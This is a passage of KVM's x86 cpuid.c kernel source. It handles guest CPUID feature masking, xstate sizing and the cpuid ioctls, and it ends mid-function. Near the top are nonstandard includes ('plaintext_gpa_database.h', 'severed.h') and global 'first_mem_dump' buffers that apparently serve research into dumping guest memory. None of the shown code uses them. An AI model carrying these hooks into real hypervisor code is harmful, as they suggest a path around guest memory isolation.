/*
 * Kernel-based Virtual Machine driver for Linux
 * cpuid support routines
 *
 * derived from arch/x86/kvm/x86.c
 *
 * Copyright 2011 Red Hat, Inc. and/or its affiliates.
 * Copyright IBM Corporation, 2008
 *
 * This work is licensed under the terms of the GNU GPL, version 2.  See
 * the COPYING file in the top-level directory.
 *
 */

#include <linux/export.h>
#include <linux/kvm_host.h>
#include <linux/sched/stat.h>
#include <linux/uaccess.h>
#include <linux/vmalloc.h>

#include "cpuid.h"
#include "lapic.h"
#include "mmu.h"
#include "pmu.h"
#include "trace.h"
#include <asm/fpu/xstate.h>
#include <asm/processor.h>
#include <asm/user.h>

#include <asm/tlbflush.h>
#include <linux/plaintext_gpa_database.h>
#include <linux/severed.h>

uint8_t *first_mem_dump;
uint8_t *buf_page;

static u32 xstate_required_size(u64 xstate_bv, bool compacted) {
  int feature_bit = 0;
  u32 ret = XSAVE_HDR_SIZE + XSAVE_HDR_OFFSET;

  xstate_bv &= XFEATURE_MASK_EXTEND;
  while (xstate_bv) {
    if (xstate_bv & 0x1) {
      u32 eax, ebx, ecx, edx, offset;
      cpuid_count(0xD, feature_bit, &eax, &ebx, &ecx, &edx);
      offset = compacted ? ret : ebx;
      ret = max(ret, offset + eax);
    }

    xstate_bv >>= 1;
    feature_bit++;
  }

  return ret;
}

bool kvm_mpx_supported(void) {
  return ((host_xcr0 & (XFEATURE_MASK_BNDREGS | XFEATURE_MASK_BNDCSR)) &&
          kvm_x86_ops->mpx_supported());
}
EXPORT_SYMBOL_GPL(kvm_mpx_supported);

u64 kvm_supported_xcr0(void) {
  u64 xcr0 = KVM_SUPPORTED_XCR0 & host_xcr0;

  if (!kvm_mpx_supported())
    xcr0 &= ~(XFEATURE_MASK_BNDREGS | XFEATURE_MASK_BNDCSR);

  return xcr0;
}

#define F(x) bit(X86_FEATURE_##x)

int kvm_update_cpuid(struct kvm_vcpu *vcpu) {
  struct kvm_cpuid_entry2 *best;
  struct kvm_lapic *apic = vcpu->arch.apic;

  best = kvm_find_cpuid_entry(vcpu, 1, 0);
  if (!best)
    return 0;

  /* Update OSXSAVE bit */
  if (boot_cpu_has(X86_FEATURE_XSAVE) && best->function == 0x1) {
    best->ecx &= ~F(OSXSAVE);
    if (kvm_read_cr4_bits(vcpu, X86_CR4_OSXSAVE))
      best->ecx |= F(OSXSAVE);
  }

  best->edx &= ~F(APIC);
  if (vcpu->arch.apic_base & MSR_IA32_APICBASE_ENABLE)
    best->edx |= F(APIC);

  if (apic) {
    if (best->ecx & F(TSC_DEADLINE_TIMER))
      apic->lapic_timer.timer_mode_mask = 3 << 17;
    else
      apic->lapic_timer.timer_mode_mask = 1 << 17;
  }

  best = kvm_find_cpuid_entry(vcpu, 7, 0);
  if (best) {
    /* Update OSPKE bit */
    if (boot_cpu_has(X86_FEATURE_PKU) && best->function == 0x7) {
      best->ecx &= ~F(OSPKE);
      if (kvm_read_cr4_bits(vcpu, X86_CR4_PKE))
        best->ecx |= F(OSPKE);
    }
  }

  best = kvm_find_cpuid_entry(vcpu, 0xD, 0);
  if (!best) {
    vcpu->arch.guest_supported_xcr0 = 0;
    vcpu->arch.guest_xstate_size = XSAVE_HDR_SIZE + XSAVE_HDR_OFFSET;
  } else {
    vcpu->arch.guest_supported_xcr0 =
        (best->eax | ((u64)best->edx << 32)) & kvm_supported_xcr0();
    vcpu->arch.guest_xstate_size = best->ebx =
        xstate_required_size(vcpu->arch.xcr0, false);
  }

  best = kvm_find_cpuid_entry(vcpu, 0xD, 1);
  if (best && (best->eax & (F(XSAVES) | F(XSAVEC))))
    best->ebx = xstate_required_size(vcpu->arch.xcr0, true);

  /*
   * The existing code assumes virtual address is 48-bit or 57-bit in the
   * canonical address checks; exit if it is ever changed.
   */
  best = kvm_find_cpuid_entry(vcpu, 0x80000008, 0);
  if (best) {
    int vaddr_bits = (best->eax & 0xff00) >> 8;

    if (vaddr_bits != 48 && vaddr_bits != 57 && vaddr_bits != 0)
      return -EINVAL;
  }

  best = kvm_find_cpuid_entry(vcpu, KVM_CPUID_FEATURES, 0);
  if (kvm_hlt_in_guest(vcpu->kvm) && best &&
      (best->eax & (1 << KVM_FEATURE_PV_UNHALT)))
    best->eax &= ~(1 << KVM_FEATURE_PV_UNHALT);

  /* Update physical-address width */
  vcpu->arch.maxphyaddr = cpuid_query_maxphyaddr(vcpu);
  kvm_mmu_reset_context(vcpu);

  kvm_pmu_refresh(vcpu);
  return 0;
}
EXPORT_SYMBOL_GPL(kvm_update_cpuid);

static int is_efer_nx(void) {
  unsigned long long efer = 0;

  rdmsrl_safe(MSR_EFER, &efer);
  return efer & EFER_NX;
}

static void cpuid_fix_nx_cap(struct kvm_vcpu *vcpu) {
  int i;
  struct kvm_cpuid_entry2 *e, *entry;

  entry = NULL;
  for (i = 0; i < vcpu->arch.cpuid_nent; ++i) {
    e = &vcpu->arch.cpuid_entries[i];
    if (e->function == 0x80000001) {
      entry = e;
      break;
    }
  }
  if (entry && (entry->edx & F(NX)) && !is_efer_nx()) {
    entry->edx &= ~F(NX);
    printk(KERN_INFO "kvm: guest NX capability removed\n");
  }
}

int cpuid_query_maxphyaddr(struct kvm_vcpu *vcpu) {
  struct kvm_cpuid_entry2 *best;

  best = kvm_find_cpuid_entry(vcpu, 0x80000000, 0);
  if (!best || best->eax < 0x80000008)
    goto not_found;
  best = kvm_find_cpuid_entry(vcpu, 0x80000008, 0);
  if (best)
    return best->eax & 0xff;
not_found:
  return 36;
}
EXPORT_SYMBOL_GPL(cpuid_query_maxphyaddr);

/* when an old userspace process fills a new kernel module */
int kvm_vcpu_ioctl_set_cpuid(struct kvm_vcpu *vcpu, struct kvm_cpuid *cpuid,
                             struct kvm_cpuid_entry __user *entries) {
  int r, i;
  struct kvm_cpuid_entry *cpuid_entries = NULL;

  r = -E2BIG;
  if (cpuid->nent > KVM_MAX_CPUID_ENTRIES)
    goto out;
  r = -ENOMEM;
  if (cpuid->nent) {
    cpuid_entries =
        vmalloc(array_size(sizeof(struct kvm_cpuid_entry), cpuid->nent));
    if (!cpuid_entries)
      goto out;
    r = -EFAULT;
    if (copy_from_user(cpuid_entries, entries,
                       cpuid->nent * sizeof(struct kvm_cpuid_entry)))
      goto out;
  }
  for (i = 0; i < cpuid->nent; i++) {
    vcpu->arch.cpuid_entries[i].function = cpuid_entries[i].function;
    vcpu->arch.cpuid_entries[i].eax = cpuid_entries[i].eax;
    vcpu->arch.cpuid_entries[i].ebx = cpuid_entries[i].ebx;
    vcpu->arch.cpuid_entries[i].ecx = cpuid_entries[i].ecx;
    vcpu->arch.cpuid_entries[i].edx = cpuid_entries[i].edx;
    vcpu->arch.cpuid_entries[i].index = 0;
    vcpu->arch.cpuid_entries[i].flags = 0;
    vcpu->arch.cpuid_entries[i].padding[0] = 0;
    vcpu->arch.cpuid_entries[i].padding[1] = 0;
    vcpu->arch.cpuid_entries[i].padding[2] = 0;
  }
  vcpu->arch.cpuid_nent = cpuid->nent;
  cpuid_fix_nx_cap(vcpu);
  kvm_apic_set_version(vcpu);
  kvm_x86_ops->cpuid_update(vcpu);
  r = kvm_update_cpuid(vcpu);

out:
  vfree(cpuid_entries);
  return r;
}

int kvm_vcpu_ioctl_set_cpuid2(struct kvm_vcpu *vcpu, struct kvm_cpuid2 *cpuid,
                              struct kvm_cpuid_entry2 __user *entries) {
  int r;

  r = -E2BIG;
  if (cpuid->nent > KVM_MAX_CPUID_ENTRIES)
    goto out;
  r = -EFAULT;
  if (copy_from_user(&vcpu->arch.cpuid_entries, entries,
                     cpuid->nent * sizeof(struct kvm_cpuid_entry2)))
    goto out;
  vcpu->arch.cpuid_nent = cpuid->nent;
  kvm_apic_set_version(vcpu);
  kvm_x86_ops->cpuid_update(vcpu);
  r = kvm_update_cpuid(vcpu);
out:
  return r;
}

int kvm_vcpu_ioctl_get_cpuid2(struct kvm_vcpu *vcpu, struct kvm_cpuid2 *cpuid,
                              struct kvm_cpuid_entry2 __user *entries) {
  int r;

  r = -E2BIG;
  if (cpuid->nent < vcpu->arch.cpuid_nent)
    goto out;
  r = -EFAULT;
  if (copy_to_user(entries, &vcpu->arch.cpuid_entries,
                   vcpu->arch.cpuid_nent * sizeof(struct kvm_cpuid_entry2)))
    goto out;
  return 0;

out:
  cpuid->nent = vcpu->arch.cpuid_nent;
  return r;
}

static void cpuid_mask(u32 *word, int wordnum) {
  *word &= boot_cpu_data.x86_capability[wordnum];
}

static void do_cpuid_1_ent(struct kvm_cpuid_entry2 *entry, u32 function,
                           u32 index) {
  entry->function = function;
  entry->index = index;
  cpuid_count(entry->function, entry->index, &entry->eax, &entry->ebx,
              &entry->ecx, &entry->edx);
  entry->flags = 0;
}

static int __do_cpuid_ent_emulated(struct kvm_cpuid_entry2 *entry, u32 func,
                                   u32 index, int *nent, int maxnent) {
  switch (func) {
  case 0:
    entry->eax = 7;
    ++*nent;
    break;
  case 1:
    entry->ecx = F(MOVBE);
    ++*nent;
    break;
  case 7:
    entry->flags |= KVM_CPUID_FLAG_SIGNIFCANT_INDEX;
    if (index == 0)
      entry->ecx = F(RDPID);
    ++*nent;
  default:
    break;
  }

  entry->function = func;
  entry->index = index;

  return 0;
}

static inline int __do_cpuid_ent(struct kvm_cpuid_entry2 *entry, u32 function,
                                 u32 index, int *nent, int maxnent) {
  int r;
  unsigned f_nx = is_efer_nx() ? F(NX) : 0;
#ifdef CONFIG_X86_64
  unsigned f_gbpages =
      (kvm_x86_ops->get_lpage_level() == PT_PDPE_LEVEL) ? F(GBPAGES) : 0;
  unsigned f_lm = F(LM);
#else
  unsigned f_gbpages = 0;
  unsigned f_lm = 0;
#endif
  unsigned f_rdtscp = kvm_x86_ops->rdtscp_supported() ? F(RDTSCP) : 0;
  unsigned f_invpcid = kvm_x86_ops->invpcid_supported() ? F(INVPCID) : 0;
  unsigned f_mpx = kvm_mpx_supported() ? F(MPX) : 0;
  unsigned f_xsaves = kvm_x86_ops->xsaves_supported() ? F(XSAVES) : 0;
  unsigned f_umip = kvm_x86_ops->umip_emulated() ? F(UMIP) : 0;
  unsigned f_intel_pt = kvm_x86_ops->pt_supported() ? F(INTEL_PT) : 0;
  unsigned f_la57 = 0;

  /* cpuid 1.edx */
  const u32 kvm_cpuid_1_edx_x86_features =
      F(FPU) | F(VME) | F(DE) | F(PSE) | F(TSC) | F(MSR) | F(PAE) | F(MCE) |
      F(CX8) | F(APIC) | 0 /* Reserved */ | F(SEP) | F(MTRR) | F(PGE) | F(MCA) |
      F(CMOV) | F(PAT) | F(PSE36) | 0 /* PSN */ | F(CLFLUSH) |
      0 /* Reserved, DS, ACPI */ | F(MMX) | F(FXSR) | F(XMM) | F(XMM2) |
      F(SELFSNOOP) | 0 /* HTT, TM, Reserved, PBE */;
  /* cpuid 0x80000001.edx */
  const u32 kvm_cpuid_8000_0001_edx_x86_features =
      F(FPU) | F(VME) | F(DE) | F(PSE) | F(TSC) | F(MSR) | F(PAE) | F(MCE) |
      F(CX8) | F(APIC) | 0 /* Reserved */ | F(SYSCALL) | F(MTRR) | F(PGE) |
      F(MCA) | F(CMOV) | F(PAT) | F(PSE36) | 0 /* Reserved */ | f_nx |
      0 /* Reserved */ | F(MMXEXT) | F(MMX) | F(FXSR) | F(FXSR_OPT) |
      f_gbpages | f_rdtscp | 0 /* Reserved */ | f_lm | F(3DNOWEXT) | F(3DNOW);
  /* cpuid 1.ecx */
  const u32 kvm_cpuid_1_ecx_x86_features =
      /* NOTE: MONITOR (and MWAIT) are emulated as NOP,
       * but *not* advertised to guests via CPUID ! */
      F(XMM3) | F(PCLMULQDQ) | 0 /* DTES64, MONITOR */ |
      0 /* DS-CPL, VMX, SMX, EST */ | 0 /* TM2 */ | F(SSSE3) | 0 /* CNXT-ID */ |
      0 /* Reserved */ | F(FMA) | F(CX16) | 0 /* xTPR Update, PDCM */ |
      F(PCID) | 0 /* Reserved, DCA */ | F(XMM4_1) | F(XMM4_2) | F(X2APIC) |
      F(MOVBE) | F(POPCNT) | 0 /* Reserved*/ | F(AES) | F(XSAVE) |
      0 /* OSXSAVE */ | F(AVX) | F(F16C) | F(RDRAND);
  /* cpuid 0x80000001.ecx */
  const u32 kvm_cpuid_8000_0001_ecx_x86_features =
      F(LAHF_LM) | F(CMP_LEGACY) | 0 /*SVM*/ | 0 /* ExtApicSpace */ |
      F(CR8_LEGACY) | F(ABM) | F(SSE4A) | F(MISALIGNSSE) | F(3DNOWPREFETCH) |
      F(OSVW) | 0 /* IBS */ | F(XOP) | 0 /* SKINIT, WDT, LWP */ | F(FMA4) |
      F(TBM) | F(TOPOEXT) | F(PERFCTR_CORE);

  /* cpuid 0x80000008.ebx */
  const u32 kvm_cpuid_8000_0008_ebx_x86_features =
      F(WBNOINVD) | F(AMD_IBPB) | F(AMD_IBRS) | F(AMD_SSBD) | F(VIRT_SSBD) |
      F(AMD_SSB_NO) | F(AMD_STIBP);

  /* cpuid 0xC0000001.edx */
  const u32 kvm_cpuid_C000_0001_edx_x86_features =
      F(XSTORE) | F(XSTORE_EN) | F(XCRYPT) | F(XCRYPT_EN) | F(ACE2) |
      F(ACE2_EN) | F(PHE) | F(PHE_EN) | F(PMM) | F(PMM_EN);

  /* cpuid 7.0.ebx */
  const u32 kvm_cpuid_7_0_ebx_x86_features =
      F(FSGSBASE) | F(BMI1) | F(HLE) | F(AVX2) | F(SMEP) | F(BMI2) | F(ERMS) |
      f_invpcid | F(RTM) | f_mpx | F(RDSEED) | F(ADX) | F(SMAP) |
      F(AVX512IFMA) | F(AVX512F) | F(AVX512PF) | F(AVX512ER) | F(AVX512CD) |
      F(CLFLUSHOPT) | F(CLWB) | F(AVX512DQ) | F(SHA_NI) | F(AVX512BW) |
      F(AVX512VL) | f_intel_pt;

  /* cpuid 0xD.1.eax */
  const u32 kvm_cpuid_D_1_eax_x86_features =
      F(XSAVEOPT) | F(XSAVEC) | F(XGETBV1) | f_xsaves;

  /* cpuid 7.0.ecx*/
  const u32 kvm_cpuid_7_0_ecx_x86_features =
      F(AVX512VBMI) | F(LA57) | F(PKU) | 0 /*OSPKE*/ | F(AVX512_VPOPCNTDQ) |
      F(UMIP) | F(AVX512_VBMI2) | F(GFNI) | F(VAES) | F(VPCLMULQDQ) |
      F(AVX512_VNNI) | F(AVX512_BITALG) | F(CLDEMOTE);

  /* cpuid 7.0.edx*/
  const u32 kvm_cpuid_7_0_edx_x86_features =
      F(AVX512_4VNNIW) | F(AVX512_4FMAPS) | F(SPEC_CTRL) | F(SPEC_CTRL_SSBD) |
      F(ARCH_CAPABILITIES) | F(INTEL_STIBP) | F(MD_CLEAR);

  /* all calls to cpuid_count() should be made on the same cpu */
  get_cpu();

  r = -E2BIG;

  if (*nent >= maxnent)
    goto out;

  do_cpuid_1_ent(entry, function, index);
  ++*nent;

  switch (function) {
  case 0:
    entry->eax = min(entry->eax, (u32)(f_intel_pt ? 0x14 : 0xd));
    break;
  case 1:
    entry->edx &= kvm_cpuid_1_edx_x86_features;
    cpuid_mask(&entry->edx, CPUID_1_EDX);
    entry->ecx &= kvm_cpuid_1_ecx_x86_features;
    cpuid_mask(&entry->ecx, CPUID_1_ECX);
    /* we support x2apic emulation even if host does not support
     * it since we emulate x2apic in software */
    entry->ecx |= F(X2APIC);
    break;
  /* function 2 entries are STATEFUL. That is, repeated cpuid commands
   * may return different values. This forces us to get_cpu() before
   * issuing the first command, and also to emulate this annoying behavior
   * in kvm_emulate_cpuid() using KVM_CPUID_FLAG_STATE_READ_NEXT */
  case 2: {
    int t, times = entry->eax & 0xff;

    entry->flags |= KVM_CPUID_FLAG_STATEFUL_FUNC;
    entry->flags |= KVM_CPUID_FLAG_STATE_READ_NEXT;
    for (t = 1; t < times; ++t) {
      if (*nent >= maxnent)
        goto out;

      do_cpuid_1_ent(&entry[t], function, 0);
      entry[t].flags |= KVM_CPUID_FLAG_STATEFUL_FUNC;
      ++*nent;
    }
    break;
  }
  /* function 4 has additional index. */
  case 4: {
    int i, cache_type;

    entry->flags |= KVM_CPUID_FLAG_SIGNIFCANT_INDEX;
    /* read more entries until cache_type is zero */
    for (i = 1;; ++i) {
      if (*nent >= maxnent)
        goto out;

      cache_type = entry[i - 1].eax & 0x1f;
      if (!cache_type)
        break;
      do_cpuid_1_ent(&entry[i], function, i);
      entry[i].flags |= KVM_CPUID_FLAG_SIGNIFCANT_INDEX;
      ++*nent;
    }
    break;
  }
  case 6:             /* Thermal management */
    entry->eax = 0x4; /* allow ARAT */
    entry->ebx = 0;
    entry->ecx = 0;
    entry->edx = 0;
    break;
  case 7: {
    entry->flags |= KVM_CPUID_FLAG_SIGNIFCANT_INDEX;
    /* Mask ebx against host capability word 9 */
    if (index == 0) {
      entry->ebx &= kvm_cpuid_7_0_ebx_x86_features;
      cpuid_mask(&entry->ebx, CPUID_7_0_EBX);
      // TSC_ADJUST is emulated
      entry->ebx |= F(TSC_ADJUST);
      entry->ecx &= kvm_cpuid_7_0_ecx_x86_features;
      f_la57 = entry->ecx & F(LA57);
      cpuid_mask(&entry->ecx, CPUID_7_ECX);
      /* Set LA57 based on hardware capability. */
      entry->ecx |= f_la57;
      entry->ecx |= f_umip;
      /* PKU is not yet implemented for shadow paging. */
      if (!tdp_enabled || !boot_cpu_has(X86_FEATURE_OSPKE))
        entry->ecx &= ~F(PKU);
      entry->edx &= kvm_cpuid_7_0_edx_x86_features;
      cpuid_mask(&entry->edx, CPUID_7_EDX);
      /*
       * We emulate ARCH_CAPABILITIES in software even
       * if the host doesn't support it.
       */
      entry->edx |= F(ARCH_CAPABILITIES);
    } else {
      entry->ebx = 0;
      entry->ecx = 0;
      entry->edx = 0;
    }
    entry->eax = 0;
    break;
  }
  case 9:
    break;
  case 0xa: { /* Architectural Performance Monitoring */
    struct x86_pmu_capability cap;
    union cpuid10_eax eax;
    union cpuid10_edx edx;

    perf_get_x86_pmu_capability(&cap);

    /*
     * Only support guest architectural pmu on a host
     * with architectural pmu.
     */
    if (!cap.version)
      memset(&cap, 0, sizeof(cap));

    eax.split.version_id = min(cap.version, 2);
    eax.split.num_counters = cap.num_counters_gp;
    eax.split.bit_width = cap.bit_width_gp;
    eax.split.mask_length = cap.events_mask_len;

    edx.split.num_counters_fixed = cap.num_counters_fixed;
    edx.split.bit_width_fixed = cap.bit_width_fixed;
    edx.split.reserved = 0;

    entry->eax = eax.full;
    entry->ebx = cap.events_mask;
    entry->ecx = 0;
    entry->edx = edx.full;
    break;
  }
  /* function 0xb has additional index. */
  case 0xb: {
    int i, level_type;

    entry->flags |= KVM_CPUID_FLAG_SIGNIFCANT_INDEX;
    /* read more entries until level_type is zero */
    for (i = 1;; ++i) {
      if (*nent >= maxnent)
        goto out;

      level_type = entry[i - 1].ecx & 0xff00;
      if (!level_type)
        break;
      do_cpuid_1_ent(&entry[i], function, i);
      entry[i].flags |= KVM_CPUID_FLAG_SIGNIFCANT_INDEX;
      ++*nent;
    }
    break;
  }
  case 0xd: {
    int idx, i;
    u64 supported = kvm_supported_xcr0();

    entry->eax &= supported;
    entry->ebx = xstate_required_size(supported, false);
    entry->ecx = entry->ebx;
    entry->edx &= supported >> 32;
    entry->flags |= KVM_CPUID_FLAG_SIGNIFCANT_INDEX;
    if (!supported)
      break;

    for (idx = 1, i = 1; idx < 64; ++idx) {
      u64 mask = ((u64)1 << idx);
      if (*nent >= maxnent)
        goto out;

      do_cpuid_1_ent(&entry[i], function, idx);
      if (idx == 1) {
        entry[i].eax &= kvm_cpuid_D_1_eax_x86_features;
        cpuid_mask(&entry[i].eax, CPUID_D_1_EAX);
        entry[i].ebx = 0;
        if (entry[i].eax & (F(XSAVES) | F(XSAVEC)))
          entry[i].ebx = xstate_required_size(supported, true);
      } else {
        if (entry[i].eax == 0 || !(supported & mask))
          continue;
        if (WARN_ON_ONCE(entry[i].ecx & 1))
          continue;
      }
      entry[i].ecx = 0;
      entry[i].edx = 0;
      entry[i].flags |= KVM_CPUID_FLAG_SIGNIFCANT_INDEX;
      ++*nent;
      ++i;
    }
    break;
  }
  /* Intel PT */
  case 0x14: {
    int t, times = entry->eax;

    if (!f_intel_pt)
      break;

    entry->flags |= KVM_CPUID_FLAG_SIGNIFCANT_INDEX;
    for (t = 1; t <= times; ++t) {
      if (*nent >= maxnent)
        goto out;
      do_cpuid_1_ent(&entry[t], function, t);
      entry[t].flags |= KVM_CPUID_FLAG_SIGNIFCANT_INDEX;
      ++*nent;
    }
    break;
  }
  case KVM_CPUID_SIGNATURE: {
    static const char signature[12] = "KVMKVMKVM\0\0";
    const u32 *sigptr = (const u32 *)signature;
    entry->eax = KVM_CPUID_FEATURES;
    entry->ebx = sigptr[0];
    entry->ecx = sigptr[1];
    entry->edx = sigptr[2];
    break;
  }
  case KVM_CPUID_FEATURES:
    entry->eax =
        (1 << KVM_FEATURE_CLOCKSOURCE) | (1 << KVM_FEATURE_NOP_IO_DELAY) |
        (1 << KVM_FEATURE_CLOCKSOURCE2) | (1 << KVM_FEATURE_ASYNC_PF) |
        (1 << KVM_FEATURE_PV_EOI) | (1 << KVM_FEATURE_CLOCKSOURCE_STABLE_BIT) |
        (1 << KVM_FEATURE_PV_UNHALT) | (1 << KVM_FEATURE_PV_TLB_FLUSH) |
        (1 << KVM_FEATURE_ASYNC_PF_VMEXIT) | (1 << KVM_FEATURE_PV_SEND_IPI);

    if (sched_info_on())
      entry->eax |= (1 << KVM_FEATURE_STEAL_TIME);

    entry->ebx = 0;
    entry->ecx = 0;
    entry->edx = 0;
    break;
  case 0x80000000:
    entry->eax = min(entry->eax, 0x8000001f);
    break;
  case 0x80000001:
    entry->edx &= kvm_cpuid_8000_0001_edx_x86_features;
    cpuid_mask(&entry->edx, CPUID_8000_0001_EDX);
    entry->ecx &= kvm_cpuid_8000_0001_ecx_x86_features;
    cpuid_mask(&entry->ecx, CPUID_8000_0001_ECX);
    break;
  case 0x80000007: /* Advanced power management */
    /* invariant TSC is CPUID.80000007H:EDX[8] */
    entry->edx &= (1 << 8);
    /* mask against host */
    entry->edx &= boot_cpu_data.x86_power;
    entry->eax = entry->ebx = entry->ecx = 0;
    break;
  case 0x80000008: {
    unsigned g_phys_as = (entry->eax >> 16) & 0xff;
    unsigned virt_as = max((entry->eax >> 8) & 0xff, 48U);
    unsigned phys_as = entry->eax & 0xff;

    if (!g_phys_as)
      g_phys_as = phys_as;
    entry->eax = g_phys_as | (virt_as << 8);
    entry->edx = 0;
    /*
     * IBRS, IBPB and VIRT_SSBD aren't necessarily present in
     * hardware cpuid
     */
    if (boot_cpu_has(X86_FEATURE_AMD_IBPB))
      entry->ebx |= F(AMD_IBPB);
    if (boot_cpu_has(X86_FEATURE_AMD_IBRS))
      entry->ebx |= F(AMD_IBRS);
    if (boot_cpu_has(X86_FEATURE_VIRT_SSBD))
      entry->ebx |= F(VIRT_SSBD);
    entry->ebx &= kvm_cpuid_8000_0008_ebx_x86_features;
    cpuid_mask(&entry->ebx, CPUID_8000_0008_EBX);
    /*
     * The preference is to use SPEC CTRL MSR instead of the
     * VIRT_SPEC MSR.
     */
    if (boot_cpu_has(X86_FEATURE_LS_CFG_SSBD) &&
        !boot_cpu_has(X86_FEATURE_AMD_SSBD))
      entry->ebx |= F(VIRT_SSBD);
    break;
  }
  case 0x80000019:
    entry->ecx = entry->edx = 0;
    break;
  case 0x8000001a:
    break;
  case 0x8000001d:
    break;
  /*Add support for Centaur's CPUID instruction*/
  case 0xC0000000:
    /*Just support up to 0xC0000004 now*/
    entry->eax = min(entry->eax, 0xC0000004);
    break;
  case 0xC0000001:
    entry->edx &= kvm_cpuid_C000_0001_edx_x86_features;
    cpuid_mask(&entry->edx, CPUID_C000_0001_EDX);
    break;
  case 3: /* Processor serial number */
  case 5: /* MONITOR/MWAIT */
  case 0xC0000002:
  case 0xC0000003:
  case 0xC0000004:
  default:
    entry->eax = entry->ebx = entry->ecx = entry->edx = 0;
    break;
  }

  kvm_x86_ops->set_supported_cpuid(function, entry);

  r = 0;

out:
  put_cpu();

  return r;
}

static int do_cpuid_ent(struct kvm_cpuid_entry2 *entry, u32 func, u32 idx,
                        int *nent, int maxnent, unsigned int type) {
  if (type == KVM_GET_EMULATED_CPUID)
    return __do_cpuid_ent_emulated(entry, func, idx, nent, maxnent);

  return __do_cpuid_ent(entry, func, idx, nent, maxnent);
}

#undef F

struct kvm_cpuid_param {
  u32 func;
  u32 idx;
  bool has_leaf_count;
  bool (*qualifier)(const struct kvm_cpuid_param *param);
};

static bool is_centaur_cpu(const struct kvm_cpuid_param *param) {
  return boot_cpu_data.x86_vendor == X86_VENDOR_CENTAUR;
}

static bool sanity_check_entries(struct kvm_cpuid_entry2 __user *entries,
                                 __u32 num_entries, unsigned int ioctl_type) {
  int i;
  __u32 pad[3];

  if (ioctl_type != KVM_GET_EMULATED_CPUID)
    return false;

  /*
   * We want to make sure that ->padding is being passed clean from
   * userspace in case we want to use it for something in the future.
   *
   * Sadly, this wasn't enforced for KVM_GET_SUPPORTED_CPUID and so we
   * have to give ourselves satisfied only with the emulated side. /me
   * sheds a tear.
   */
  for (i = 0; i < num_entries; i++) {
    if (copy_from_user(pad, entries[i].padding, sizeof(pad)))
      return true;

    if (pad[0] || pad[1] || pad[2])
      return true;
  }
  return false;
}

int kvm_dev_ioctl_get_cpuid(struct kvm_cpuid2 *cpuid,
                            struct kvm_cpuid_entry2 __user *entries,
                            unsigned int type) {
  struct kvm_cpuid_entry2 *cpuid_entries;
  int limit, nent = 0, r = -E2BIG, i;
  u32 func;
  static const struct kvm_cpuid_param param[] = {
      {.func = 0, .has_leaf_count = true},
      {.func = 0x80000000, .has_leaf_count = true},
      {.func = 0xC0000000, .qualifier = is_centaur_cpu, .has_leaf_count = true},
      {.func = KVM_CPUID_SIGNATURE},
      {.func = KVM_CPUID_FEATURES},
  };

  if (cpuid->nent < 1)
    goto out;
  if (cpuid->nent > KVM_MAX_CPUID_ENTRIES)
    cpuid->nent = KVM_MAX_CPUID_ENTRIES;

  if (sanity_check_entries(entries, cpuid->nent, type))
    return -EINVAL;

  r = -ENOMEM;
  cpuid_entries =
      vzalloc(array_size(sizeof(struct kvm_cpuid_entry2), cpuid->nent));
  if (!cpuid_entries)
    goto out;

  r = 0;
  for (i = 0; i < ARRAY_SIZE(param); i++) {
    const struct kvm_cpuid_param *ent = &param[i];

    if (ent->qualifier && !ent->qualifier(ent))
      continue;

    r = do_cpuid_ent(&cpuid_entries[nent], ent->func, ent->idx, &nent,
                     cpuid->nent, type);

    if (r)
      goto out_free;

    if (!ent->has_leaf_count)
      continue;

    limit = cpuid_entries[nent - 1].eax;
    for (func = ent->func + 1; func <= limit && nent < cpuid->nent && r == 0;
         ++func)
      r = do_cpuid_ent(&cpuid_entries[nent], func, ent->idx, &nent, cpuid->nent,
                       type);

    if (r)
      goto out_free;
  }

  r = -EFAULT;
  if (copy_to_user(entries, cpuid_entries,
                   nent * sizeof(struct kvm_cpuid_entry2)))
    goto out_free;
  cpuid->nent = nent;
  r = 0;

out_free:
  vfree(cpuid_entries);
out:
  return r;
}

static int move_to_next_stateful_cpuid_entry(struct kvm_vcpu *vcpu, int i) {
  struct kvm_cpuid_entry2 *e = &vcpu->arch.cpuid_entries[i];
  struct kvm_cpuid_entry2 *ej;
  int j = i;
  int nent = vcpu->arch.cpuid_nent;

  e->flags &= ~KVM_CPUID_FLAG_STATE_READ_NEXT;
  /* when no next entry is found, the current entry[i] is reselected */
  do {
    j = (j + 1) % nent;
    ej = &vcpu->arch.cpuid_entries[j];
  } while (ej->function != e->function);

  ej->flags |= KVM_CPUID_FLAG_STATE_READ_NEXT;

  return j;
}

/* find an entry with matching function, matching index (if needed), and that
 * should be read next (if it's stateful) */
static int is_matching_cpuid_entry(struct kvm_cpuid_entry2 *e, u32 function,
                                   u32 index) {
  if (e->function != function)
    return 0;
  if ((e->flags & KVM_CPUID_FLAG_SIGNIFCANT_INDEX) && e->index != index)
    return 0;
  if ((e->flags & KVM_CPUID_FLAG_STATEFUL_FUNC) &&
      !(e->flags & KVM_CPUID_FLAG_STATE_READ_NEXT))
    return 0;
  return 1;
}

struct kvm_cpuid_entry2 *kvm_find_cpuid_entry(struct kvm_vcpu *vcpu,
                                              u32 function, u32 index) {
  int i;
  struct kvm_cpuid_entry2 *best = NULL;

  for (i = 0; i < vcpu->arch.cpuid_nent; ++i) {
    struct kvm_cpuid_entry2 *e;

    e = &vcpu->arch.cpuid_entries[i];
    if (is_matching_cpuid_entry(e, function, index)) {
      if (e->flags & KVM_CPUID_FLAG_STATEFUL_FUNC)
        move_to_next_stateful_cpuid_entry(vcpu, i);
      best = e;
      break;
    }
  }
  return best;
}
EXPORT_SYMBOL_GPL(kvm_find_cpuid_entry);

/*
 * If no match is found, check whether we exceed the vCPU's limit
 * and return the content of the highest valid _standard_ leaf instead.
 * This is to satisfy the CPUID specification.
 */
static struct kvm_cpuid_entry2 *check_cpuid_limit(struct kvm_vcpu *vcpu,
                                                  u32 function, u32 index) {
  struct kvm_cpuid_entry2 *maxlevel;

  maxlevel = kvm_find_cpuid_entry(vcpu, function & 0x80000000, 0);
  if (!maxlevel || maxlevel->eax >= function)
    return NULL;
  if (function & 0x80000000) {
    maxlevel = kvm_find_cpuid_entry(vcpu, 0, 0);
    if (!maxlevel)
      return NULL;
  }
  return kvm_find_cpuid_entry(vcpu, maxlevel->eax, index);
}

bool kvm_cpuid(struct kvm_vcpu *vcpu, u32 *eax, u32 *ebx, u32 *ecx, u32 *edx,
               bool check_limit) {
  u32 function = *eax, index = *ecx;
  struct kvm_cpuid_entry2 *best;
  bool entry_found = true;

  best = kvm_find_cpuid_entry(vcpu, function, index);

  if (!best) {
    entry_found = false;
    if (!check_limit)
      goto out;

    best = check_cpuid_limit(vcpu, function, index);
  }

out:
